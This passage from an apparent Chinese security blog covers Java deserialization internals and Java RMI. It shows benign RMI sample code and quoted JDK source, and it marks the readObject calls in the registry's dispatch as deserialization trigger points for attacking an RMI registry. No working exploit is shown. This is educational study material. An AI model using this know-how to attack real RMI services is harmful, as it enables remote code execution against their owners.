src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240114190832039.png" alt="vlist.doCallbacks()"></p><p>总结一下整个序列化流程：</p><p>1.readObject进入readObject0，根据字节选择对应的方法，比如类就会进入readOrdinaryObject</p><p>2.readOrdinaryObject中先获取类描述符，进入readClassDesc，根据字节选择对应的类描述符获取方法，其中会调用resolveClass反射实例化我们的目标类</p><p>3.readOrdinaryObject再进入readSerialData，根据刚刚的类描述符去填充数据，其中如果目标类重写了readObject则调用，否则就使用默认的填充方法。</p><h2 id="0x04-安全隐患"><a href="#0x04-安全隐患" class="headerlink" title="0x04 安全隐患"></a>0x04 安全隐患</h2><p>也许你会说，哪有程序员会写上面例子中的那种弱智的代码？确实很少有，但在真实应用中，一些危险操作往往藏得相对隐蔽，不会像我上面这样写的赤裸裸，不过最终的原理都是相同的。</p><p>在开发时产生的反序列化漏洞常见的有以下几种情况：</p><ol><li>重写ObjectInputStream对象的resolveClass方法（这是用来解析传入的类的方法）中的检测可被绕过。</li><li>使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。因此，如果在审计过程中发现了采用黑名单进行过滤的代码，多半存在一两个‘漏网之鱼’可以利用。并且采取黑名单方式仅仅可能保证此刻的安全，若在后期添加了新的功能，就可能引入了新的漏洞利用方式。所以仅靠黑名单是无法保证序列化过程的安全的。</li></ol><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>本篇只是了解了反序列化以及其具体的实现流程，作为一篇过渡文章，后面进一步学习一些利用链的相关内容。</p><p><em><strong>参考文章:</strong></em></p><p><a href="https://xz.aliyun.com/t/2041?time__1311=n4+xnioDw4RnGODlEme0=3i==4Y5PNiQx&amp;alichlgref=https://www.google.com/">Java反序列化漏洞从入门到深入</a></p><p><a href="https://chenlvtang.top/2022/09/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E5%8F%8AresolveClass/">Java反序列化流程分析及resolveClass</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 0-1 javaSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再谈RMI</title>
      <link href="/2024/01/13/%E5%86%8D%E8%B0%88RMI/"/>
      <url>/2024/01/13/%E5%86%8D%E8%B0%88RMI/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前一篇关于RMI的文章写的稍微粗糙了些，写这一篇再巩固一下RMI的内容并做一些延伸。</p><h2 id="0x01-一些细节"><a href="#0x01-一些细节" class="headerlink" title="0x01 一些细节"></a>0x01 一些细节</h2><p>网上关于RMI服务端和客户端编写的文章方法很多，我上一篇是分为接口、服务端、客户端三个部分编写的，当时是将rmi registry和rmi server都写到了服务端类中：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="type">RMIServer</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIServer</span>();</span><br><span class="line">            <span class="type">Hello</span> <span class="variable">stub</span> <span class="operator">=</span> (Hello) UnicastRemoteObject.exportObject(obj, <span class="number">8888</span>);<span class="comment">//该语句执行后会运行一个 rmi server，监听本地8888端口等待client的请求</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>); <span class="comment">// 该语句执行后会创建并启动 rmi registry，监听在本地 1099 端口</span></span><br><span class="line">            <span class="comment">//exportObject() 方法返回结果为 remote object stub (代理对象，实现了与 Hello 接口同样的方法，包含 rmi server 的 host、port 信息)</span></span><br><span class="line">            registry.bind(<span class="string">"Hello"</span>, stub); <span class="comment">// 将 stub 注册到 registry，并与 name Hello 绑定</span></span><br><span class="line"></span><br><span class="line">        } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">            System.out.println(<span class="string">"Server Exception: "</span> + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException {</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello, World"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>因为是在本地环境下，为了避免麻烦，就直接写到了一起。但是在低版本的jdk中，注册中心rmi registry与rmi server是可以分离的，甚至可以是运行在不同的主机上。但官方文档中是这样说：</p><blockquote><p>出于安全原因，应用程序只能绑定或取消绑定到在同一主机上运行的注册中心。这样可以防止客户端删除或覆盖服务器的远程注册表中的条目。但是，查找操作是任意主机都可以进行的。</p></blockquote><p>也就是说不建议将rmi registry和rmi server分离到不同主机来运行，我们后文会提到为什么会有这样的安全考虑。</p><p>另外该段代码是使用UnicastRemoteObject的exportObject方法来导出远程对象，并监听8888端口运行一个 rmi server。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hello</span> <span class="variable">stub</span> <span class="operator">=</span> (Hello) UnicastRemoteObject.exportObject(obj, <span class="number">8888</span>)</span><br></pre></td></tr></tbody></table></figure><p>接着是通过<code>registry.bind("Hello", stub)</code>将”Hello”与stub的映射关系绑定到rmi registry上，这种绑定方式不需要书写完整的RMI URL，只需写对象名称”Hello”即可。</p><p>这是我参考的<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/hello/hello-world.html">官网</a>上的做法，但网上的大部分文章更多是利用下面的方式：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer2</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Hello</span>{</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException{</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException{</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Hello, World"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">        <span class="type">RemoteHello</span> <span class="variable">rh</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHello</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">"rmi://127.0.0.1:1099/Hello"</span>, rh);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">        <span class="type">RMIServer2</span> <span class="variable">rs2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIServer2</span>();</span><br><span class="line">        rs2.start();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里使用了<code>java.rmi.Naming</code>类，该类又叫做命名服务，提供了一种方便的方式来绑定和查找远程对象。可以看一下它的bind方法的源码，发现它是通过解析URI绑定远程对象，将URI拆分成主机、端口和远程对象名称，最后使用的仍是<code>Registry</code>类的<code>bind</code>来进行操作的：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String name, Remote obj)</span></span><br><span class="line">    <span class="keyword">throws</span> AlreadyBoundException,</span><br><span class="line">        java.net.MalformedURLException,</span><br><span class="line">        RemoteException</span><br><span class="line">{</span><br><span class="line">    <span class="type">ParsedNamingURL</span> <span class="variable">parsed</span> <span class="operator">=</span> parseURL(name);</span><br><span class="line">    <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> getRegistry(parsed);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">"cannot bind to null"</span>);</span><br><span class="line"></span><br><span class="line">    registry.bind(parsed.name, obj);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们在<code>rmi client</code>中也可以使用<code>Naming</code>类的<code>lookup</code>方法来查找远程对象(可以看到client端简洁了许多)：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello)</span><br><span class="line">                Naming.lookup(<span class="string">"rmi://192.168.0.107:1099/Hello"</span>);</span><br><span class="line">        System.out.println(hello.sayHello());</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>上面说到，相比于直接使用Registry类, Naming类在绑定和查找操作时需要的是一个URL，需要说明的时，很多文章都指出该URL的形式一定要下面这样：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmi://host:port/objName</span><br></pre></td></tr></tbody></table></figure><p>但其实并不是。首先，其中的<code>rmi:</code>是可以省略的，也就是可以写成这样：<code>//host:port/objName</code>(但不要少了前面的双斜杠，否则会报错)；其次，如果服务端或者客户端和RMI registry在同一主机上运行，那么<code>host</code>和<code>port</code>也可以省略，也就是直接远程对象名<code>objName</code>。</p><blockquote><p>另外，对于绑定方法，在<code>Naming</code>类和<code>Registry</code>类，除了<code>bind</code>还要<code>rebind</code>，两者区别如下：</p><p><code>rebind</code>是指“重绑定”，如果“重绑定”时<code>rmi registry</code>已经有了这个服务name的存在，则之前所绑定的Remote Object将会被替换；而<code>bind</code>在执行时如果“绑定”时<code>rmi registry</code>已经有这个服务name的存在，则系统会抛出错误。</p><p>所以除非有特别的业务要求，一般建议使用rebind方法进行Remote Object绑定。</p></blockquote><h2 id="0x02-RMI利用"><a href="#0x02-RMI利用" class="headerlink" title="0x02 RMI利用"></a>0x02 RMI利用</h2><p>讲了这么多，只是涉及了rmi具体通信原理以及如何实现，下面来从利用的层面讲讲。</p><p>关于利用的方法，可以分别从攻击rmi registry、攻击rmi server、攻击rmi client角度来实现，由于篇幅和本人水平有限（对java反序列化的知识掌握不深），本文就略带介绍一下利用方式，具体实现在以后的文章中进行。</p><h3 id="攻击rmi-registry"><a href="#攻击rmi-registry" class="headerlink" title="攻击rmi registry"></a>攻击rmi registry</h3><p>也许你也注意到上文中提到的，rmi server可以通过bind、rebind等方法申请在rmi registry上进行绑定注册，那么想想是否可以伪造成一个远程的rmi server注册一个恶意远程服务上去呢？</p><p>前文也说过，在低版本的jdk本中（8u121），rmi registry和rmi server可以不在一台服务器上，此时是可以利用这种方法攻击注册中心的。但是通常情况下，我们遇到的场景都是高版本的jdk，此时这种攻击注册中心的方式就不太适用。</p><p>由于我没能下载到低版本的jdk，部分源码片段我就截取了网上的文章进行说明。</p><p>我们先来看前面贴上的<code>java.rmi.Naming#bind</code>方法的源码，其中它会将URL拆解后的结果作为参数放到<code>getRegistry</code>方法中从而得到一个<code>registry</code>:</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> getRegistry(parsed);</span><br></pre></td></tr></tbody></table></figure><p>那么查看这个<code>getRegistry</code>方法源码：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(ParsedNamingURL parsed)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> LocateRegistry.getRegistry(parsed.host, parsed.port);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以看到这里归根到底调用的还是LocateRegistry类的getRegistry方法，继续跟踪进去：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port,</span></span><br><span class="line"><span class="params">                                       RMIClientSocketFactory csf)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">{</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (port &lt;= <span class="number">0</span>)</span><br><span class="line">            port = Registry.REGISTRY_PORT;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (host == <span class="literal">null</span> || host.length() == <span class="number">0</span>) {</span><br><span class="line">            <span class="comment">// If host is blank (as returned by "file:" URL in 1.0.2 used in</span></span><br><span class="line">            <span class="comment">// java.rmi.Naming), try to convert to real local host name so</span></span><br><span class="line">            <span class="comment">// that the RegistryImpl's checkAccess will not fail.</span></span><br><span class="line">            <span class="keyword">try</span> {</span><br><span class="line">                host = java.net.InetAddress.getLocalHost().getHostAddress();</span><br><span class="line">            } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">                <span class="comment">// If that failed, at least try "" (localhost) anyway...</span></span><br><span class="line">                host = <span class="string">""</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Create a proxy for the registry with the given host, port, and</span></span><br><span class="line"><span class="comment">         * client socket factory.  If the supplied client socket factory is</span></span><br><span class="line"><span class="comment">         * null, then the ref type is a UnicastRef, otherwise the ref type</span></span><br><span class="line"><span class="comment">         * is a UnicastRef2.  If the property</span></span><br><span class="line"><span class="comment">         * java.rmi.server.ignoreStubClasses is true, then the proxy</span></span><br><span class="line"><span class="comment">         * returned is an instance of a dynamic proxy class that implements</span></span><br><span class="line"><span class="comment">         * the Registry interface; otherwise the proxy returned is an</span></span><br><span class="line"><span class="comment">         * instance of the pregenerated stub class for RegistryImpl.</span></span><br><span class="line"><span class="comment">         **/</span></span><br><span class="line">        <span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">LiveRef</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port, csf, <span class="literal">null</span>),</span><br><span class="line">                        <span class="literal">false</span>);</span><br><span class="line">        <span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span></span><br><span class="line">            (csf == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef) : <span class="keyword">new</span> <span class="title class_">UnicastRef2</span>(liveRef);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (Registry) Util.createProxy(RegistryImpl.class, ref, <span class="literal">false</span>);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>这里getRegistry方法有好几种重载方式，前面所说的传入不同形式的URL，正好对应了这几种重载方式，我这里粘贴的是最终调用的这个核心的getRegistry方法。前面的if判断是处理port和host的，然后分别实例化了liveRef和RemoteRef对象，这一段过程应该是用过来处理网络通信相关的，不用管，直接定位最后的返回语句，调用了createProxy方法。关于这个方法，要涉及到动态代理的内容（给自己挖个坑，以后研究），它会根据传入的class对象，返回一个代理，也就是说，这里传入<code>RegistryImpl.class</code>后，得到的其实是一个RegistryImpl_Stub对象，即远程的Registry接口在本地的代理。</p><p>我们再回到Naming类的bind方法中，接下来就是执行<code>registry.bind(parsed.name, obj);</code>语句，这里调用了<code>registry</code>的<code>bind方法</code>,其实是调用的RegistryImpl_Stub类中的bind方法，我们定位到该类的bind方法：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String var1, Remote var2)</span> <span class="keyword">throws</span> AccessException, AlreadyBoundException, RemoteException {</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="type">StreamRemoteCall</span> <span class="variable">var3</span> <span class="operator">=</span> (StreamRemoteCall)<span class="built_in">this</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">0</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var4</span> <span class="operator">=</span> var3.getOutputStream();</span><br><span class="line">            var4.writeObject(var1);</span><br><span class="line">            var4.writeObject(var2);</span><br><span class="line">        } <span class="keyword">catch</span> (IOException var5) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">"error marshalling arguments"</span>, var5);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.ref.invoke(var3);</span><br><span class="line">        <span class="built_in">this</span>.ref.done(var3);</span><br><span class="line">    } <span class="keyword">catch</span> (RuntimeException var6) {</span><br><span class="line">        <span class="keyword">throw</span> var6;</span><br><span class="line">    } <span class="keyword">catch</span> (RemoteException var7) {</span><br><span class="line">        <span class="keyword">throw</span> var7;</span><br><span class="line">    } <span class="keyword">catch</span> (AlreadyBoundException var8) {</span><br><span class="line">        <span class="keyword">throw</span> var8;</span><br><span class="line">    } <span class="keyword">catch</span> (Exception var9) {</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">"undeclared checked exception"</span>, var9);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>前面处理一些约定好的数据，比如host、port以及要绑定的对象和对象名称，我们直接定位到invoke那一句，invoke这里会把请求发出去，这里会调用Skeleton代理即<code>sun.rmi.registry.RegistryImpl_Skel</code>类中的<code>dispatch</code>方法来处理请求，需要注意的是，在这里之后是无法通过断点进入到<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>方法中的，看一篇文章说是在bind函数执行处<code>sun.rmi.registry.RegistryImpl#bind</code>下一个断点，直接运行就可以得到调用栈，再回去找就行了。</p><p>我们定位查看重要逻辑代码：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(var3) {</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">try</span> { <span class="comment">//bind方法</span></span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">// readObject反序列化触发</span></span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                } <span class="keyword">catch</span> (IOException var94) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">"error unmarshalling arguments"</span>, var94);</span><br><span class="line">                } <span class="keyword">catch</span> (ClassNotFoundException var95) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">"error unmarshalling arguments"</span>, var95);</span><br><span class="line">                } <span class="keyword">finally</span> {</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                var6.bind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                } <span class="keyword">catch</span> (IOException var93) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">"error marshalling return"</span>, var93);</span><br><span class="line">                }</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">//list()方法</span></span><br><span class="line">                var2.releaseInputStream();</span><br><span class="line">                String[] var97 = var6.list();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var98</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var98.writeObject(var97);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                } <span class="keyword">catch</span> (IOException var92) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">"error marshalling return"</span>, var92);</span><br><span class="line">                }</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">try</span> {  <span class="comment">// lookup()方法</span></span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">// readObject反序列化触发</span></span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                } <span class="keyword">catch</span> (IOException var89) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">"error unmarshalling arguments"</span>, var89);</span><br><span class="line">                } <span class="keyword">catch</span> (ClassNotFoundException var90) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">"error unmarshalling arguments"</span>, var90);</span><br><span class="line">                } <span class="keyword">finally</span> {</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                var8 = var6.lookup(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var9</span> <span class="operator">=</span> var2.getResultStream(<span 